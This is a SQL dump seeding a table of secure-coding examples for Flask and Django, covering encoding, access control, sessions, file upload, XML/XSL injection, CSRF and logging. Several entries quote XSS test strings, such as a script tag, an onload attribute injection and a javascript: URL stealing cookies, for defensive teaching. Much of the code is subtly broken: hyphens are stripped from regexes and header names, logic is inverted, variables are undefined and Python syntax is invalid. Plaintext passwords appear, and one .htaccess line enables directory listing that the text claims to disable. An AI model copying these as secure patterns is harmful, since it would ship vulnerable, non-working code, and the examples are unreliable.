        ', 'User registration SQL truncation', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Character encoding


 Example:

	
    """
    This is the encoder class for whenever you have to allow certain
    possibly dangerous characters into your code for i.e names such as O''Reilly
	"""

	def encoder(allowed, input, count):
	    
	    """
	    As you can see you can specify allowed characters in your function
	    """
	    
	    flag = True
	    match = re.findall("/^[azAZ09 " + allowed+"]+$/", input)

	    if match:

	        """
	        Set a log for whenever there is unexpected userinput with a threat level
	        See "audit logs" code example for more information:
	        """

	        setLog(session[''id''], "Bad userinputs", "FAIL", datetime.utcnow(), "HIGH")
	        
	        """
	        Set counter if counter hits 3 the users session must terminated
	        After 3 session terminations the user account must be blocked
	        See "audit logs" code example for more information:
	        """
	        
	        counter.increment()
	        flag = False

	        //Remove Dangerous Characters
	        wordDict = {''&'': ''&amp;'', ''<'' : ''&lt;'', ''>'' : ''&gt;'' , ''"'' : ''&quot;'', "''" : ''&x27;'', ''/'' : &x2F;, ''\'' : ''\\''}

	        for key in wordDict:
	        	input = input.replace(key, wordDict[key])

	        return input
', 'Encoder', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Aggregate user controls


 Example:

 
    """
    In order to enforce Aggregate access control protection the best method would be to
    define your rules by means of a database structure rather than sessions or log''s.
    This is due to the fact that if the user drops his session the rating would start
    al over again.

    TABLE users
       
    | userID | userName | password | privilegeID |    access    | AggregateControl	|
      
    |   1    | Admin    | Csdar323 |      1      |     TRUE     |	  2322    	    |
       
    |   2    | User     | Adf4fsv  |      2      |     FALSE    |	  0             |
      
    |   3    | Guest    | dff4fKr  |      3      |     TRUE     |	  125           |
    

    TABLE privileges
       
    | privilegeID | privilege        |
    
    |     1       | edit:read:delete |
    
    |     2       | edit:read        |
    
    |     3       | read             |
    
    """

    def countAccess(count):
        
        """
        Each time the user accesses the database we keep track of the number of times he
        connected. Whenever the user passes a reasonable number he should be rejected
        since he could be an attacker scraping your table contents and stealing company information
        You could a CRON job in your mysql system in order to clean the Aggregate column within certain timeframes
        """
            
        setLog(session[''id''], "User access database ", "SUCCESS", datetime.utcnow(), "NULL")
        registered_user = User.query.filter_by(id=session[''id'']).first()
            
        //We add the count to control variable for the update
        control = registered_user.AggregateControl + count
            
        //Check the aggregate
        if control > 5000:
            setLog(session[''id''], "Aggregate control breach", "FAIL", date("dmy"), "HIGH")
                
            """
            Then we lock out the users account assuming it has been compromised by
            an attacker
            """
                
            access = "Fail"
            registered_user.status = access
            
            //we update the users table and count +1 tot the AggregateControl column
            registered_user.AggregateControl = control

            db.session.commit()', 'Aggregate user controls', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Absolute time out of a session


 Example:
	
	
	"""
	Whenever a session is started, absolute time out (lifetime) of a session should be set in seconds
	"""

	from flask import Flask, session

	//Initialize the flask application
	app = Flask(__name__)

	//Set the secret key.  keep this really secret:
	app.secret_key = open("/dev/random","rb").read(32) 

	Name of the session cookie
	app.config[''SESSION_COOKIE_NAME''] = ''hrj''

	Path for the session cookie
	app.config[''SESSION_COOKIE_PATH''] = ''/''
	
	//Domain for the session cookie
	//Configure domains, do not use .yourdomain.com (wildcard)
	//This increases the attack surface!
	app.config[''SESSION_COOKIE_DOMAIN''] = ''demo.yourdomain.com''
	
	//Controls if the cookie should be set with the secure flag
	app.config[''SESSION_COOKIE_SECURE''] = True
	
	//Controls if the cookie should be set with the httponly flag
	app.config[''SESSION_COOKIE_HTTPONLY''] = True
	
	//Lifetime of a permanent session
	app.config[''PERMANENT_SESSION_LIFETIME''] = 3600

	//Store Value in session
	session[''type''] = "value"
', 'Absolute timeout of a session', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Sandboxing


 Example:


	<iframe sandbox="value">
		/*
		sandbox=""  Applies all restrictions
		allowforms  Reenables form submission
		allowpointerlock  Reenables APIs
		allowpopups  Reenables popups
		allowsameorigin  Allows the iframe content to be treated as being from the same origin
		allowscripts  Reenables scripts
		allowtopnavigation  Allows the iframe content to navigate its toplevel browsing context
		*/
	</iframe>

', 'Sandboxing', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Identifierbased authorization


 Example:


    """
    Define the whitelist pattern and validation type and input parameter like:
    identity("page1,page2", "alphanumeric", page)
    """

    def identity(whiteListPattern, validationType, inputParameter):

    	continue = True

    	"""
    	First, we want to filter the filenames for expected values. For this example we use only az/09
    	Whenever the values are tampered with, we can assume an attacker is trying to inject malicious input.
    	for more information about validation see "input validations" in the code examples:
    	"""

    	if inputValidation(inputParameter, validationType, "Invalid userinput", "HIGH", countLevel) == False:
            continue = False

    	"""
    	Second, we want to whitelist the filenames for expected values, in this example they are,
    	page1,page2 etc.. for more information about whitelisting see "whitelisting" in the code examples:
    	"""

    	if whitelisting(whiteListPattern, inputParameter) == False:
            continue = False

    	"""
    	Whenever you are checking whether a user is restricted to review certain data,
    	the access restrictions should be processed server side.
    	The userID could be stored inside a session variable on login, and should be used to
    	retrieve user data from the database:
    	"""
    	
        if continue == True : 

    		"""
    		We count the number of connections towards the database,
    		See "aggregate user controls" code example for more information:
    		"""

            countAccess(1)
            data = Table.query.filter_by(id=session[''id''], page=inputParameter).first()

            return data

        else:

            return False', 'Identifier based authorization', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Charsets


 Example:


    """
    In order to set the "Charsets" header you''ll have to add the following code to the head of your application, the following code could be used in your controller: For Example, text/html
    """

    //You add directly into the HTML markup
    <meta httpequiv="ContentType" content="text/html; charset=utf8">

    @app.after_request
    def content_Type_Charset(response):
      response.headers["ContentType"] = "text/html; charset=utf8"
      return response
', 'Charsets', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Content type headers


 Example:


	//Content Type Header for HTML pages
	response.headers["ContentType"] = "text/html; charset=UTF8"
    return response

    //Content Type Header for JSON objects
	response.headers["ContentType"] = "application/json"
    return response    
', 'Content type headers', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' XML injection prevention


 Example:


    """
	Whenever you are using XML parsers you must sanitize or encode al userinput before
	including this input into your XML file.

	Some methods like below, the Dom document already encodes the input before storing it
	into the XML. But beware, since this encoded input is still a threat whenever you are
	displaying the this data on screen as HTML output. This encoded data should be escaped
	at all times before displaying.

	Whenever your XML function does not encode your data on the fly, you may want to write
	your own function for achieving this. See the code examples and search for "Input encoding"
	for more detailed information.
	"""


	//Let us take an easy example where we store your favorite number name into a XML file.
	from lxml import etree

	//Create Root Element employees

	root = etree.Element("employees")
	
	//Create child Element for employees
	employee = etree.SubElement(root, "employee")
	name = etree.SubElement(employee, "name")
	
	//Insert the text in name tag
	name.text = request.form[''name'']

	//Save it in xml file
	with open("test.xml", "w") as f:
		f.write(etree.tostring(root, pretty_print=True))

	"""
	We will try to insert <script>alert(123);</script> into the XML file,
	Now after inserting the employee name into the XML file it will look like:

	<?xml version="1.0"?>
	<employees>
		<employee>
			<name>&lt;script&gt;alert(123);&lt;/script&gt;</name>
		</employee>
	</employees>

	As you can see de input has been encoded but still can trigger an XSS whenever we
	extract the data as shown in the example below:

	NOTE: if you ever want to include the xml files by means of userselected sources,
	be aware of the fact that an attacker could also include sources from external websites
	and even execute External entity injections on your applications. See the "XSLT injection prevention"
	code example for more detailed information on how to implement this type of functionality since
	the same principle''s apply to both functions.
	"""
	
		//Read from a XML file
		x = etree.parse("test.xml")


		for element in x.iter("name"):
   	 		//This example is vulnerable to XSS
   	 		print element.text

   	 		//This example is escaped
   	 		print escape(element.text)

	"""
	We recommend to not rely solely on the encoding of the input by the Dom document.
	So before you insert userinput into the XML file you want to have it sanitized.
	See the "Encoding" and "input validation" code examples for more detailed information
	"""

 
', 'XML injection prevention', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' File upload


 Example:

    
	import os
	from flask import render_template, flash
	from flask import Flask, render_template,request, redirect
	from flask import url_for,send_from_directory
	from werkzeug.utils import secure_filename

	"""
	Always store the uploaded files in a directory somewhere outside the document root or that is not 
	accessible from the web. Because there is chance that attacker could upload malicious file and 
	later access it via the web server. 
	"""
	
	//Path to the upload directory
	app.config[''UPLOAD_FOLDER''] = ''~/uploads/''
	
	//Extensions which are accepted to be uploaded
	app.config[''ALLOWED_EXTENSIONS''] = set([''png'', ''jpg'', ''jpeg'', ''pdf''])
	
	//Check whether the file can be uploaded
	def allowed_file(filename):
	    return ''.'' in filename and \
	           filename.rsplit(''.'', 1)[1].lower() in app.config[''ALLOWED_EXTENSIONS'']

	//File upload route
	@app.route(''/upload'', methods=[''POST''])
	def upload_file():
		setLog(0, "Upload function has started", "SUCCESS", str(datetime.utcnow()), "HIGH")

	    //Check if the post request has the file part
	    if ''file'' not in request.files:
	        flash(''No file part'')
	        return redirect(request.url)
	    
	    //Get the name of the uploaded file
	    file = request.files[''file'']

	    //Submit a empty part without filename
	    if file.filename == '''':
	        flash(''No selected file'')
	        setLog(0, "No File was selected", "FAIL", str(datetime.utcnow()), "HIGH")
	        return redirect(request.url)
	    
	    //Check if the file is one of the allowed types/extensions
	    if file and allowed_file(file.filename):
	        
	        //Make the filename safe, remove unsupported chars
	        filename = secure_filename(file.filename)
	
	        //Remove the input when filename contains more than single dot
	        if len(filename.split(''.'')) > 1:
	        	return redirect(request.url)

	        //Move the file form the temporal folder to the upload folder we setup
	        file.save(os.path.join(app.config[''UPLOAD_FOLDER''], filename))

	        //Redirect the user to the uploaded_file route, which will basically show on the browser the uploaded file
	        setLog(0, "Upload was successful", "SUCCESS", str(datetime.utcnow()), "HIGH")
	        return redirect(url_for(''uploaded_file'', filename=filename))
	        
	    else:
	        flash(''Not allowed extensions'')       
	        //Log the unsuccessful upload
	        setLog(0, "Upload was not successful, not allowed extensions", "FAIL", str(datetime.utcnow()), "HIGH")
	        return redirect(request.url)

	@app.route(''/uploads/<filename>'')
	def uploaded_file(filename):
	    return send_from_directory(app.config[''UPLOAD_FOLDER''], filename)
	
', 'File upload', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Privilege based authentication


 Example:

        
    """
    For privilege based authentication we need an extra table in your database in order to write the users privileges to.

    TABLE users
        
    | userID | userName | password | privilegeID |    access	| AggregateControl	  |
       
    | 1	     | Admin	  | Csdar323 |	  1		     | 	   TRUE		|		2336		          |
       	
    |	2	     | User		  | Adf4fsv  |	  2		     |	   FALSE	|		 0		        	  |
       
    |	3	     | Guest	  | dff4fKr  |	  3		     |	   TRUE		|		135		        	  |
       

    TABLE privileges
       
    | privilegeID | privilege 		   |
    
    |   1	 	      | edit:read:delete |
    
    |	  2	 	      | edit:read		     |
    
    |	  3	 	      | read			       |
    

    Now instead of using roles in sessions we rather want to assign privileges to users
    by means of a DatabaseBased Authentication system.
    Now we can easily assign a user certain privileges for him to access.

    Here is the isAuthorized function in which we check whether the user is permitted to do the action
    """

    def isAuthorized(ispermitted):

      //Select Privilege from the database
      data = Users.query.join(privileges, Users.projectID==privileges.projectID).filter_by(Users.userId==session[''id''], privileges.access=''TRUE'').all()

      privilege = data.privilege

      //We first explode the value''s to see how much parts the arrays consists of
      permission = privilege.split('':'')
      authorization = ispermitted.split('':'')

      //Then we count the authorization array
      count = len(authorization)
      counthits = 0

      """
      We check the permissions against the ispermitted value to see how many times
      they match. whenever they match we count the hits
      """

      for value in permission:
        if value == ispermitted:
          counthits = countshits + 1

      """
      Whenever the counts hits are greater or equal to the needed permissions
      we now know we deserved access to the part of the system.
      """

      if counthits > count:
        //Log that the user had sufficient privileges:
        setLog(session[''id''], "User was privileged!", "SUCCESS", str(datetime.utcnow()), privilege, "NULL")
        return True
      else:
        //Log that the user had sufficient privileges:
        setLog(session[''id''], "User was not privileged!", "FAIL", str(datetime.utcnow()), privilege, "HIGH")

        """
        Set counter; if counter hits 3, the user''s session must be terminated.
        After 3 session terminations the user''s account must be blocked.
        Given the high threat level, there will be immediate session termination.
        in this case the user tried to manipulate the application operation in order to do things he is not
        privileged to, immediate session termination will follow!
        """

        Counter.increment(3)
        return False
        ', 'Privilege based authentication', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' HTML output


 Example:


    """
    Whenever user input is displayed in the application, whether, as content or a parameter value
    submitted towards the url, all user input should be properly escaped to prevent XSS injections.
    """

    For normal output this escaping will do the trick
    from flask import escape
    @app.route(''/'', methods=[''GET'', ''POST''])
    def index():
        return escape(request.form[''name''])

    This also applies, for instance, when retrieving content from a database:
    @app.route(''/'')
        admin = User.query.filter_by(username=''admin'').first()
        return escape(admin.email)
    
     For removing dangerous characters : 

    wordDict = {''&'': ''&amp;'', ''<'' : ''&lt;'', ''>'' : ''&gt;'' , ''"'' : ''&quot;'', "''" : ''&x27;'', ''/'' : &x2F;, ''\'' : ''\\''}

    for key in wordDict:
        input = input.replace(key, wordDict[key])

     For UNTRUSTED DATA in <a href="/site/search?value=UNTRUSTED DATA">clickme</a>
     URL Encoding for defense

    import urllib
    input = urllib.quote_plus(input)

    """
    Security consists of different layers of protection, in order to guarantee the integrity
    of your application. This means that the value submitted from the user should
    already be sanitized before being submitted towards the database in order to prevent XSS.
    As an example, you are expecting only alphanumerical value here:
    """
    match = re.findall("^[azAZ09]+$", value)
    if match:
        return True
    else:
        raise Exception("User supplied value not in the range " + range)

    """
    This type of approach should be used whenever you are allowing userinput in
    your DOM like for example, let''s say a user was allowed to upload an image and
    set an alt text. when you do not sanitize his input a possible attack string could be:
    """
    
    this is an image" onload="alert(''XSS'');"

    """
    whenever this string now is added to the users image this will be the outcome, leading
    to xss:
    """

    <img src="http://image.com/image.jpg" alt="this is an image" onload="alert(''XSS'')"" />

    """
    After this sanitation malicious code can no longer exist in the $_POST[''value''] variable.

    Another possibility for attackers to execute an XSS injection, is to pass malicious code directly
    into the URL by means of a "href", e.g.:
    javascript:alert(document.cookie);
    or
    data:text/html;base64,base64xssinjection

    In the following scenario escaping with htmlspecialchars() is not sufficient to block the injection.
    By checking the URL to see if it starts with either http:// or https:// whenever a link has
    been submitted to the web application by a user.

    def before_request(url):
        if url.startswith(''http://'') or url.startswith(''https://''):
            return True
        else:
            raise Exception("Not a valid URL : " + url)

    

    
', 'HTML output', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' XXSSProtection header


 Example:

    
    """
    In order to set the XXSSProtection header, you''ll have to add the following code to the head of your application

    For adding XXSS Protection in every page we have to add a middleware
    Make a middleware in yourapp/middleware.py
    """

    class MyMiddleware:

    	def __init__(self, get_response):
        	self.get_response = get_response

    	def __call__(self, request):
        	response = self.get_response(request)
        	response[''XXSSProtection''] = "1; mode=block"
        	return response
   	
   	//For adding middleware in the project, add in yourproject/settings.py
   	MIDDLEWARE = [
    	...,
    	''yourapp.middleware.MyMiddleware'',
    	...,
	]	

	//For adding in the individual response page using render_to_response
	response = render_to_response("template.html", {})
	response[''XXSSProtection''] = ''1; mode=block''

	return response

	//For adding in the individual response page using render
	response = render(request, "template.html", {})
	response[''XXSSProtection''] = ''1; mode=block''

	return response', 'X XSS Protection header', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Enforce secure passwords


 Example:

    
    def checkPassword(pwd):
    	error = []
    	proceed = True

    	//Recommended a longer password for Security
    	if(len(pwd) < 13):
        	error.append("Password is too Short!!")
        	proceed = False
    
		"""
		The password should include at least one number, a small letter, a CAPS,
		and a special character as defined in the patterns array:
		"""
    
    	if not any(x.isupper() for x in pwd):
        	error.append(''Your password needs at least 1 capital letter'')
    	if not any(x.islower() for x in pwd):
        	error.append(''Your password needs at least 1 small letter'')
    	if not any(x.isdigit() for x in pwd):
        	error.append(''Your password needs at least 1 digit'')

		"""
		Even though your password is sufficient according to all your standards, the password could still be weak.
		Just imagine the password "Password!"; this could easily be guessed by an attacker. To prevent the use of weak passwords we 
		compare the password with a list of top 500 bad passwords and if matched, the password wil be rejected:
		"""

    	file = open(''badpasswords.txt'').read()
    	pattern = file.split(",") 

    	for value in pattern:
        	if value != pwd:
            	pass
        	else:
            	error.append("Your password was matched with the bad password list, please try again.")
            	proceed = False
            	break
    	if proceed == True:
        	flash("Your password is allowed!")
        	return True
        else:
        	flash("Password validation failure(your choice is weak):")
        	for x in error:
            	print x
        	return False', 'Enforce secure passwords', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Reauthentication


 Example:


    """
    Whenever a user wants to change his credentials or do other important data exchanges such as
    transferring money he should always be challenged to reauthenticate himself before
    allowing them to perform these actions.
    """
    
    from django.contrib.auth import authenticate, login

    def reauthenticate(request, password):
        //Access current_user
        current_user = request.user
        username = current_user.username
        //Authenticate user
        user = authenticate(request, username=username, password=password)
        //Validation of password 
        if user is not None:
            //After successful validation we will log that password was validated successfully
            log.info(''Successful reauthentication user : {user} via ip: {ip}''.format(
                user=user,
                ip=ip
            ))

            //Flush Session token 
            request.session.flush()
            //Make the current_user active
            current_user.is_active = 1
            //Save the session ID 
            login(request, user)
            //Success page 
            return render(request, ''polls/home.html'')
        else:
            //The user failed reauthenticating himself
            log.warning(''Reauthentication Failed!! user : {user} via ip: {ip}''.format(
                user=user,
                ip=ip
            ))
            //If authentication failed destroyed the session
            request.session.flush()
            return render(request, ''polls/login.html'')

    """
    Before we let a user perform certain actions he should first be challenged to authenticate
    himself. imagine the following scenario, the user wants to change his email address.
    """

    //Usage Example
    reauthenticate(password) ', 'Re authentication', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' XSL injection prevention



 Example:


    """
	In order to prevent XSL injections you must enforce strict policy''s whenever the
	files are loaded from a source controlled by an possible attacker.

	Let''s say for example that the user can choose from several XSL files on your application.

	ABC.xsl arranges your employee names on alphabetical order
	CBA.xsl does not care and just shows the input by order of your XML file.

	Before we want to attach the XSL files to the style sheet we first want to
	do validation on the request to make sure the included file was one of our own pre
	defined files, example:
	including("file1.xsl,file2.xsl,etc", ''filename'' , $_GET[''xslfile''])
	"""

	def including(whiteListing, validation ,input, count):

		continue = True

		"""
		First, we want to filter the filenames for expected values. For this example we use only az/09 and .
		Whenever the values are tampered with, we can assume an attacker is trying to inject malicious input.
		for more information about validation see "input validations" in the code examples:
		"""

		if inputValidation(inputParameter, validationType, "Invalid userinput", "HIGH") == False:
			continue = False

		"""
		We want to whitelist the paged for expected values, in this example they are,
		page1,page2 etc.. for more information about whitelisting see "whitelisting" in the code examples:
		"""

		if whitelisting(whiteListing, input, count) == False:
			continue = False

		//If all went good we do the function
		if continue == True:
			//Load XML file
			root = etree.parse("test.xml")

			xslt_root = etree.XML(input)
			transform = etree.XSLT(xslt_root)

			//Transform the XML
			result_tree = transform(root)
		else: 
			return False', 'XSL injection prevention', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Session cookies (domain)


 Example:


	"""
	Whenever a session is started, and you want to share it over different domains,
	the domain value should be set to the specific domain

    For using sessions edit the middleware and make sure it contains ''django.contrib.sessions.middleware.SessionMiddleware''

    For adding HTTPONLY Cookies, we have to add the line in settings.py
    SESSION_COOKIE_HTTPONLY = True

    For adding Session Cookie age, we have to add the line in settings.py
    SESSION_COOKIE_AGE = 60000

    For setting session cookie domain, we have to add the line in settings.py
    SESSION_COOKIE_DOMAIN = ''demo.yourdomain.com''

	For setting session cookie name, we have to add the line in settings.py
	SESSION_COOKIE_NAME = ''demo''    
	
	For setting session cookie path, we have to add the line in settings.py
	SESSION_COOKIE_PATH = ''/''

	For setting session cookie path, we have to add the line in settings.py
	SESSION_COOKIE_SECURE = True
	"""

	//For adding session cookie
	request.session[''test''] = ''test''', 'Session cookies (domain)', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Directory listing


 Example:


    """
    To disable or prevent directory access, add following line in your .htaccess file. If
    user points the browsers to a directory that does not have an index file, then a
    "403 Forbidden" error will be displayed:

    Add this line of code to your .htaccess file:
    """

    Options Indexes

	"""
	Python code to display the files from the uploads folder
	"""

	//Views.py

        def getFiles(request, whiteListPattern, validationType, inputParameter):

            continue = True
            
            """
            First, we want to filter the filenames for expected values. For this example we use only az/09  alphanumeric
            Whenever the values are tampered with, we can assume an attacker is trying to inject malicious input.
            for more information about validation see "input validations" in the code examples:
            """
            
            if inputValidation(inputParameter, validationType) == False:
                continue = False

            """
            Second, we want to whitelist the filenames for expected values, in this example they are,
            page1,page2 etc.. for more information about whitelisting see "whitelisting" in the code examples:
            """

            //Check for filename Whitelisting
            if whitelisting(whiteListPattern, inputParameter) == False:
                continue = False

            if continue == True:
                //Create Path
                path = os.path.join(settings.MEDIA_ROOT, inputParameter)   
                images = []

                //List all the URL
                for f in os.listdir(path):
                    if f.endswith("jpg") or f.endswith("png"):
                        images.append("%s%s/%s" % (settings.MEDIA_URL, inputParameter, f))
                return render_to_response(''gallery.html'', {''images'': images})
            else:
                return render_to_response(''gallery.html'', {''images'': ''''})                

        //gallery.html
        {% for image in images %}
        <img src=''{{image}}'' />
        {% endfor %}', 'Directory listing', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Reflective file download and file download injection prevention


 Example:


	import os
	from django.conf import settings
	from django.http import HttpResponse

	def downloadUserFiles(request, fileId):
		
		//Current_user
		current_user = request.user
		proceed = True

		"""
		For the sake of example we only allow the users to download their own files
		by identifier based sql query''s. As you can see we select the filename
		by its id. in this case we prevent direct userinput into the disposition header.
		"""

		if inputValidation(fileId, "numeric", "validate was false", "HIGH", 3) == False:
			proceed = False

		if proceed = True:
			file = Download.objects.filter(fileId=password, userId=current_user.id).first()
			filename = file.fileName
			mimeType = file.mimeType

			if filename:

				"""
				We also define the mimetype per download file.
				This is because whenever a user can only download images it is not necessary to set
				an uncommon contenttype header for it.
				NOTE: These mimetypes should not be stored based upon the mimetype which was send
				the response header when the user uploaded the file. This value can be easily
				manipulated with an intercepting proxy. You should get the mimetype from the file
				itself after it was stored on the server.
				"""

				file_path = os.path.join(settings.MEDIA_ROOT, filename)
				if os.path.exists(file_path):
					with open(file_path, ''rb'') as fh:
						response = HttpResponse(fh.read(), content_type=mimeType)
						response["ContentDescription"] = "File Transfer"
						response["ContentDisposition"] = "attachment; filename=" + filename
						response["Expires"] = 0
						response["CacheControl"] = "nostore, nocache, mustrevalidate, maxage=0"
						response["CacheControl"] = "postcheck=0, precheck=0", false
						return response
				raise Http404

	"""
	The second example is for whenever you are providing users with fixed downloads
	such as manuals etc. We do not only check if the file just exists, because that would
	allow an attacker to also download important other files from your server, so instead
	we whitelist them.
	"""
	
	def downloadStored(filename):
		if os.path.exists(file_path):
			with open(file_path, ''rb'') as fh:
				if whitelisting("file1.txt,file2.txt", $filename) != False:
					response = HttpResponse(fh.read(), content_type=''text/plain'')
					response.headers["ContentDescription"] = "File Transfer"
					response.headers["ContentDisposition"] = "attachment; filename=" + filename
					response.headers["Expires"] = 0
					response.headers["CacheControl"] = "nostore, nocache, mustrevalidate, maxage=0"
					response.headers["CacheControl"] = "postcheck=0, precheck=0", false
					response.headers["ContentLength"] = os.path.getsize(filename)
					return response
raise HTTP404', 'RFD and file download injection prevention', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' XContentTypeOptions header



 Example:

    """
    In order to set the "XContentTypeOptions" header you''ll have to add the following code to the head of your application

    For adding XContentTypeOptions in every page we have to add a middleware
    Make a middleware in yourapp/middleware.py
    """

    class MyMiddleware:

    	def __init__(self, get_response):
        	self.get_response = get_response

    	def __call__(self, request):
        	response = self.get_response(request)
        	response[''XContentTypeOptions''] = "nosniff"
        	return response
   	
   	//For adding middleware in the project, add in yourproject/settings.py
   	MIDDLEWARE = [
    	...,
    	''yourapp.middleware.MyMiddleware'',
    	...,
	]	

	//For adding in the individual response page using render_to_response
	response = render_to_response("template.html", {})
	response[''XContentTypeOptions''] = ''nosniff''

	return response

	//For adding in the individual response page using render
	response = render(request, "template.html", {})
	response[''XContentTypeOptions''] = ''nosniff''
	
	return response
', 'X Content Type Options header', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Audit logs


 Example:


    """
    Django uses Python’s builtin logging module to perform system logging. 

    Methods which should be logged : 
         Data Addition
         Data modification
         Data deletion
         Data Exports
         Identifying security incidents
         Perfomance monitoring etc

    Python logging configurations consists of four parts:

      Loggers : is configured to have log level. Different log levels are DEBUG, INFO, 
                 WARNING, ERROR, CRITICAL. Each message that is written to the logger is a Log Record.
      Handlers : It describes particular logging behavior such as writing message on the screen, a file or to network socket.  
      Filters : We can place an additional criteria for logging process.
      Formatters : Formatters describe the exact format of that text.

    The logger module is inbuilt class in django for logging system information into files or sending logs through network.

    Different logging calls or mehtods : 
         logger.debug()
         logger.info()
         logger.warning()
         logger.error()
         logger.critical()
         logger.log()
         logger.exception()
    """

    //Configuring loggers with app in SETTINGS.PY
    """
    This creates polls app log file polls.log
    """
    LOGGING = {
        ''version'': 1,
        ''disable_existing_loggers'': False,
        ''handlers'': {
            ''file'': {
                ''level'': ''DEBUG'',
                ''class'': ''logging.FileHandler'',
                ''filename'': ''debug.log'',
            },
            ''applogfile'': {
                ''level'':''DEBUG'',
                ''class'':''logging.handlers.RotatingFileHandler'',
                ''filename'': os.path.join(DJANGO_ROOT, ''polls.log''),
                ''maxBytes'': 1024*1024*15,  15MB
                ''backupCount'': 10,
            },
        },
        ''loggers'': {
            ''django'': {
                ''handlers'': [''file''],
                ''level'': ''DEBUG'',
                ''propagate'': True,
            },
            ''polls'': {
                ''handlers'': [''applogfile'',],
                ''level'': ''DEBUG'',
            },
        },
    }

    //Get Client IP

    def get_client_ip(request):
        x_forwarded_for = request.META.get(''HTTP_X_FORWARDED_FOR'')
        if x_forwarded_for:
            ip = x_forwarded_for.split('','')[0]
        else:
            ip = request.META.get(''REMOTE_ADDR'')
        return ip

    //Example for logging error
    import logging

    //Get an instance of a logger
    logger = logging.getLogger(__name__)

    def my_view(request, arg1, arg):
        ...
        if bad_mojo:
            //Log an error message
            logger.error(''Something went wrong!'' + get_client_ip(request)) 


    //Example for logging critical
    import logging

    //Get an instance of a logger
    logger = logging.getLogger(__name__)

    def my_view(request, arg1, arg):
        ...
        if security_violation:
            //Log an critical message
            logger.critical(''Security violation!'' + get_client_ip(request))', 'Audit logs', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' CSRF tokens


 Example:

    
    """
    The random CSRF token generated need to be send to the server with every form submission. 

    The CSRF middleware and template tag provides easytouse protection against Cross Site Request Forgeries.
    The CSRF middleware is activated by default in the MIDDLEWARE setting.
    """

    """
    In HTML Forms, for specifying the CSRF we can use the below code
    """

    <form method="post">
    	{% csrf_token %}
	</form>

	"""
    For the AJAX POST requests, ou have to remember to pass the CSRF token in as POST data with every POST request. For this reason, there is an alternative method: on each XMLHttpRequest, set a custom XCSRFToken header to the value of the CSRF token.

    The CSRF token cookie is named csrftoken by default, but you can control the cookie name via the CSRF_COOKIE_NAME setting.

    The CSRF header name is HTTP_X_CSRFTOKEN by default, but you can customize it using the CSRF_HEADER_NAME setting.
	"""

	<script type="text/javascript">
    
    // using jQuery
    function getCookie(name) {
        var cookieValue = null;
        if (document.cookie && document.cookie !== '''') {
            var cookies = document.cookie.split('';'');
            for (var i = 0; i < cookies.length; i++) {
                var cookie = jQuery.trim(cookies[i]);
                // Does this cookie string begin with the name we want?
                if (cookie.substring(0, name.length + 1) === (name + ''='')) {
                    cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                    break;
                }
            }
        }
        return cookieValue;
    }

    $.ajaxSetup({
        beforeSend: function(xhr, settings) {
            if (!/^(GET|HEAD|OPTIONS|TRACE)$/i.test(settings.type) && !this.crossDomain) {
                xhr.setRequestHeader("XCSRFToken", getCookie(''csrftoken''));
            }
        }
    });
	</script>

    //Using CSRF in Jinja Templates
    <form action="" method="post">{{ csrf_input }}', 'CSRF tokens', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Logout function


 Example:


    """
    This way, the logout functionality will revoke the complete session:
    """
  
    from django.contrib.auth import logout

    def logout_view(request):   
        //Logging logout
        log.info(''Logout Successful : {user} via ip: {ip}''.format(
            user=user,
            ip=ip
        ))
        logout(request)
        //Redirect to a success page.
        return redirect(''login'')

    """
    Django has inbuilt logout functionality
    """

    //Adding urls.py 
    from django.conf.urls import url
    from django.conf import settings
    from django.contrib.auth.views import logout

    urlpatterns = [
        url(r''^logout/$'', logout, {''next_page'': settings.LOGOUT_REDIRECT_URL}, name=''logout'')
    ]

    //Add URI in Settings.py
    LOGOUT_REDIRECT_URL = ''/login''
', 'Logout function', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Whitelisting


 Example:


    """
    First we create a function which checks the allowed patterns:
    whitelisting("value1,value2,value3" , input)
    Whitelisting is checking if a value is identically the same as the whitelist we created. Please rewrite the below part to reflect this.
    """

    def whitelisting(allowed, input):
        result = allowed.split('','')
        flag = False
        for x in result:
            if x == match:
            //If the value is valid we send a log to the logging file
            setLog(session["id"], "Good whitelist validation", "SUCCESS", datetime.utcnow(),"HIGH")
            flag = True
            //Whenever there was a valid match we return true
            return True
            
        //Check for a false in order to send error to log and counter the user
        if flag == False:
            //If the whitelist is bad log the validation 
            setLog(session["id"], "Bad whitelist validation", "FAIL", datetime.utcnow(), "HIGH")            
            counter.increment()
            return False    
', 'White listing', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Session hijacking and fixation


 Example:

    
    """
    Session hijacking and Session fixation are attempts to gain access to another user. 
    We Should never put session IDS in the URL, use SSL and secure connection and HTTP only
    Cookies.

    We should regenerate a SESSION ID when someone logs in. But Django does regenerating 
    Session ID automatically.  

